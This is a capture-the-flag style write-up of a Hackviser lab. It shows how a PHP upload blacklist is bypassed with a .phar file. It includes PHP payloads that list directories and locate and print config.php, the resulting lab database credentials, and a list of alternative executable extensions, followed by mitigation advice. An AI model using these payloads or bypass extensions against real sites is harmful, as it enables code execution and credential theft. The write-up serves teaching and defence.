---
title: "File Extension Blacklist Bypass – Unrestricted Upload to RCE | Hackviser Lab"
date: 2026-05-04 22:30:00 +0530
categories: [Web Security, Unrestricted File Upload]
tags: [file-upload, blacklist-bypass, phar, rce, sensitive-data-exposure]
platform: Hackviser
author: Shivansh Sharma
image:
    path: /assets/images/posts/blacklist-file-upload-bypass-hackviser.webp
    alt: File Extension Blacklist Bypass 
---

## Overview

File upload functionality is commonly secured using **file extension filtering**, where dangerous extensions are blocked.

However, blacklist-based filtering is inherently weak. It relies on developers identifying and blocking every dangerous extension, which is rarely complete.

In this lab, the application attempted to block PHP uploads using a blacklist. However, it failed to block the `.phar` extension, which is executable in many PHP configurations.

This allowed uploading a malicious file, leading to **Remote Code Execution (RCE)** and extraction of sensitive database credentials.

---

## Objective

The lab stated:

> The application filters uploaded files using a file extension blacklist.

**Goal:**
- Identify an executable extension not blocked  
- Upload a malicious script  
- Read `config.php`  
- Extract the database password  

---

## Understanding the Vulnerability

The application blocked common extensions such as:

```
.php, .phtml, .php3, .php4, .php5
```

### Why this fails

Blacklist filtering only blocks **known dangerous extensions**.

➡️ If even one executable extension is missed, the protection fails completely.

---

## Why `.phar` Works

`.phar` (PHP Archive) files are often treated as executable by PHP.

This means:

```
file.phar
```

containing PHP code can still execute when accessed via the browser.

Since `.phar` was not included in the blacklist, it became a perfect bypass vector.

---

## Exploitation

### Step 1: Confirm Upload Execution

Created a test payload:

```php
<?php
echo "Upload working! Current directory: " . __DIR__ . "<br>";
echo "Files in current directory:<br>";
$files = scandir(__DIR__);
foreach ($files as $file) {
    echo $file . "<br>";
}
?>
```

Saved as:

```
file.phar
```

**Result**

```
Upload working!
Current directory: /var/www/html/uploads
Files in current directory:
...
file.phar
```

**Key Findings**

- `.phar` bypassed blacklist
- PHP execution confirmed
- Upload path identified:

```
/var/www/html/uploads
```

### Step 2: Locate config.php

To locate the configuration file, a recursive search payload was used:

```php
<?php
function find_file($filename, $dir = '.') {
    $files = scandir($dir);

    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;

        $path = $dir . '/' . $file;

        if (is_dir($path)) {
            $result = find_file($filename, $path);
            if ($result) return $result;
        } elseif ($file == $filename) {
            return $path;
        }
    }
    return false;
}

$config_path = find_file('config.php', '..');

if ($config_path) {
    echo "<pre>Found at: $config_path\n\n";
    echo htmlspecialchars(file_get_contents($config_path));
} else {
    echo "config.php not found";
}
?>
```

### Step 3: Extract Credentials

Accessing the uploaded file returned:

```php
Found at: ../config.php

<?php
    try{
        $host = 'localhost';
        $db_name = 'hv_database';
        $charset = 'utf8';
        $username = 'root';
        $password = 'Qr3eydwjjZmPpwVm';

        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
    } catch(PDOException $e){

    }
?>
```

**Proof of Exploitation**

- Bypassed extension blacklist
- Uploaded executable `.phar` file
- Achieved Remote Code Execution
- Extracted database credentials

**Database Password:**

```
Qr3eydwjjZmPpwVm
```

---

## Impact

This vulnerability enables:

- Remote Code Execution
- Arbitrary file read
- Credential disclosure
- Database compromise
- Potential full server takeover

---

## Why Blacklist Filtering Fails

Blacklist security assumes all dangerous extensions can be enumerated.

**Problem**

Developers often miss alternatives such as:

```
.phar, .pht, .php7, .pgif, .php8
```

➡️ Missing even one extension breaks the entire defense.

---

## Root Cause

**1. Blacklist-Based Filtering**
- Blocks only known extensions

**2. Missed Executable Extension**
- `.phar` remained allowed

**3. Executable Upload Directory**
- Files executed after upload

**4. Storage in Web Root**
- Direct browser access

---

## Mitigation

### Use Whitelisting

Allow only safe extensions:

```
.jpg, .jpeg, .png, .gif
```

### Validate File Content

Verify actual file structure:

```
getimagesize()
```

### Store Outside Web Root

- Prevent direct execution
- Serve via backend

### Rename Uploaded Files

- Use randomized filenames
- Prevent predictable access

### Disable Script Execution

Apache configuration:

```
php_admin_flag engine off
```

### Reprocess Uploaded Files

- Use image libraries (GD, ImageMagick)
- Strip malicious content

---

## Real-World Insight

Blacklist bypasses are extremely common in real-world applications.

Attackers frequently:

- Test alternative extensions
- Upload web shells
- Extract sensitive data
- Pivot deeper into systems

Relying on blacklists alone provides a false sense of security.

---

## Key Takeaway

Blacklist-based file upload validation is fundamentally flawed.

It only protects against known threats, while attackers exploit overlooked cases.

A secure upload system must rely on:

- Whitelisting
- Content validation
- Safe storage
- Execution restrictions

Without these, a simple upload feature becomes a direct path to Remote Code Execution and full compromise.